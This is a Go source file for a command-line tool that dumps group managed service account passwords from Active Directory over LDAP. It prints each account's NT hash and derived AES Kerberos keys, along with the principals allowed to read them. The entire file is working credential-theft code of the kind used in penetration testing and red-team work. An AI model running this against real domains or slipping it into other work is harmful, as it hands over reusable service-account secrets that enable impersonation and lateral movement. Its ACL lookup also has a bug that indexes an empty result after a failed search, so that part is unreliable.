// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// GetGMSAPassword - Dump gMSA passwords from Active Directory via LDAP.
// Usage (same target syntax as every other gopacket tool):
//
//	GetGMSAPassword [options] domain/user:password@dc01.corp.local
//	GetGMSAPassword -hashes :aabbcc... domain/user@dc01.corp.local
//	GetGMSAPassword -k -no-pass domain/user@dc01.corp.local
//	GetGMSAPassword -ldaps domain/user:password@dc01.corp.local
package main

import (
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"os"
	"strings"
	"unicode/utf16"

	"github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
	"golang.org/x/crypto/md4"

	"gopacket/pkg/flags"
	"gopacket/pkg/ldap"
	"gopacket/pkg/security"
	"gopacket/pkg/session"
)

var (
	useLDAPS = flag.Bool("ldaps", false, "Use LDAPS (port 636) instead of StartTLS on port 389")
)

type managedPasswordBlob struct {
	CurrentPassword  []byte
	PreviousPassword []byte
}

func parseManagedPasswordBlob(data []byte) (*managedPasswordBlob, error) {
	if len(data) < 16 {
		return nil, fmt.Errorf("blob too short (%d bytes)", len(data))
	}

	currentOff := int(binary.LittleEndian.Uint16(data[8:10]))
	previousOff := int(binary.LittleEndian.Uint16(data[10:12]))
	queryOff := int(binary.LittleEndian.Uint16(data[12:14]))

	var currentEnd int
	if previousOff == 0 {
		currentEnd = queryOff
	} else {
		currentEnd = previousOff
	}

	if currentOff < 0 || currentEnd > len(data) || currentOff > currentEnd {
		return nil, fmt.Errorf(
			"invalid offsets: currentOff=%d currentEnd=%d dataLen=%d",
			currentOff, currentEnd, len(data),
		)
	}

	blob := &managedPasswordBlob{
		CurrentPassword: data[currentOff:currentEnd],
	}

	if previousOff != 0 {
		prevEnd := queryOff
		if previousOff < len(data) && prevEnd <= len(data) && previousOff <= prevEnd {
			blob.PreviousPassword = data[previousOff:prevEnd]
		}
	}

	return blob, nil
}

func ntHash(utf16leBytes []byte) string {
	h := md4.New()
	h.Write(utf16leBytes)
	return hex.EncodeToString(h.Sum(nil))
}

func utf16LEToString(b []byte) string {
	if len(b)%2 != 0 {
		b = b[:len(b)-1]
	}
	u16 := make([]uint16, len(b)/2)
	for i := range u16 {
		u16[i] = binary.LittleEndian.Uint16(b[i*2 : i*2+2])
	}
	return string(utf16.Decode(u16))
}

func aesKeys(currentPasswordBlob []byte, domain, sam string) (aes128, aes256 string, err error) {

	pwBytes := currentPasswordBlob
	if len(pwBytes) >= 2 {
		pwBytes = pwBytes[:len(pwBytes)-2]
	}

	password := utf16LEToString(pwBytes)

	samName := strings.TrimSuffix(sam, "$")
	salt := fmt.Sprintf("%shost%s.%s",
		strings.ToUpper(domain),
		strings.ToLower(samName),
		strings.ToLower(domain),
	)

	e128, e := crypto.GetEtype(etypeID.AES128_CTS_HMAC_SHA1_96)
	if e != nil {
		return "", "", fmt.Errorf("AES-128 etype: %w", e)
	}
	k128, e := e128.StringToKey(password, salt, "")
	if e != nil {
		return "", "", fmt.Errorf("AES-128 derivation: %w", e)
	}
	aes128 = hex.EncodeToString(k128)

	e256, e := crypto.GetEtype(etypeID.AES256_CTS_HMAC_SHA1_96)
	if e != nil {
		return "", "", fmt.Errorf("AES-256 etype: %w", e)
	}
	k256, e := e256.StringToKey(password, salt, "")
	if e != nil {
		return "", "", fmt.Errorf("AES-256 derivation: %w", e)
	}
	aes256 = hex.EncodeToString(k256)

	return aes128, aes256, nil
}

func resolveACLPrincipals(client *ldap.Client, baseDN string, raw []byte) []string {
	sd, err := security.ParseSecurityDescriptor(raw)
	if err != nil {
		log.Printf("    [!] failed to parse security descriptor: %v", err)
		return nil
	}

	if sd.DACL == nil {
		return nil
	}

	var names []string
	for _, ace := range sd.DACL.ACEs {
		if ace.SID == nil {
			continue
		}
		sidStr := ace.SID.String()

		filter := fmt.Sprintf("(objectSid=%s)", ldapEscapeSID(ace.SID))
		res, err := client.Search(baseDN, filter, []string{"sAMAccountName"})
		if err != nil || len(res.Entries) == 0 {
			names = append(names, sidStr)
		}
		names = append(names, res.Entries[0].GetAttributeValue("sAMAccountName"))
	}
	return names
}

func ldapEscapeSID(sid *security.SID) string {
	raw := sid.Marshal()
	var sb strings.Builder
	for _, b := range raw {
		fmt.Fprintf(&sb, "\\%02x", b)
	}
	return sb.String()
}



func main() {

	opts := flags.Parse()

	if opts.TargetStr == "" {
		flag.Usage()
		os.Exit(1)
	}

	target, creds, err := session.ParseTargetString(opts.TargetStr)
	if err != nil {
		log.Fatalf("[-] Error parsing target string: %v", err)
	}

	opts.ApplyToSession(&target, &creds)

	if !opts.NoPass {
		if err := session.EnsurePassword(&creds); err != nil {
			log.Fatal(err)
		}
	}

	if target.Port == 0 {
		if *useLDAPS {
			target.Port = 636
		} else {
			target.Port = 389
		}
	}

	client := ldap.NewClient(target, &creds)
	defer client.Close()

	if err := client.Connect(*useLDAPS); err != nil {
		log.Fatalf("[-] Connection failed: %v", err)
	}

	domain := creds.Domain

	if creds.Domain != "" && creds.Hash == "" && !creds.UseKerberos {
		creds.Username = fmt.Sprintf("%s@%s", creds.Username, creds.Domain)
		creds.Domain = ""
	}

	if err := client.Login(); err != nil {
		log.Fatalf("[-] Bind failed: %v", err)
	}

	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		log.Fatalf("[-] Failed to get naming context: %v", err)
	}

	attrs := []string{
		"sAMAccountName",
		"msDS-ManagedPassword",
		"msDS-GroupMSAMembership",
	}

	results, err := client.Search(
		baseDN,
		"(&(objectClass=msDS-GroupManagedServiceAccount))",
		attrs,
	)
	if err != nil {
		log.Fatalf("[-] LDAP search failed: %v", err)
	}

	if len(results.Entries) == 0 {
		fmt.Println("[-] No gMSAs returned.")
		return
	}

	for _, entry := range results.Entries {
		sam := entry.GetAttributeValue("sAMAccountName")
		fmt.Printf("[*] Users or groups who can read password for %s:\n", sam)

		membershipRaw := entry.GetRawAttributeValue("msDS-GroupMSAMembership")
		if len(membershipRaw) > 0 {
			principals := resolveACLPrincipals(client, baseDN, membershipRaw)
			if len(principals) == 0 {
				fmt.Println("(no principals found in DACL)")
			}
			for _, p := range principals {
				fmt.Printf("> %s\n", p)
			}
		} else {
			fmt.Println("(msDS-GroupMSAMembership not returned – insufficient rights?)")
		}

		pwRaw := entry.GetRawAttributeValue("msDS-ManagedPassword")
		if len(pwRaw) == 0 {
			fmt.Println("[!] msDS-ManagedPassword is empty – no read access or channel not encrypted")
			fmt.Println()
			continue
		}

		blob, err := parseManagedPasswordBlob(pwRaw)
		if err != nil {
			fmt.Printf("[!] Failed to parse password blob: %v\n\n", err)
			continue
		}

		pwNoNull := blob.CurrentPassword
		if len(pwNoNull) >= 2 {
			pwNoNull = pwNoNull[:len(pwNoNull)-2]
		}
		nt := ntHash(pwNoNull)

		fmt.Printf("%s:::%s\n", sam, nt)

		if domain == "" {
			domain = baseDNtoDomain(baseDN)
		}

		aes128, aes256, err := aesKeys(blob.CurrentPassword, domain, sam)
		if err != nil {
			fmt.Printf("[!] AES key derivation failed: %v\n", err)
		} else {
			fmt.Printf("%s:aes256-cts-hmac-sha1-96:%s\n", sam, aes256)
			fmt.Printf("%s:aes128-cts-hmac-sha1-96:%s\n", sam, aes128)
		}

		fmt.Println()
	}
}

func baseDNtoDomain(baseDN string) string {
	var parts []string
	for _, segment := range strings.Split(baseDN, ",") {
		segment = strings.TrimSpace(segment)
		if strings.HasPrefix(strings.ToUpper(segment), "DC=") {
			parts = append(parts, segment[3:])
		}
	}
	return strings.Join(parts, ".")
}
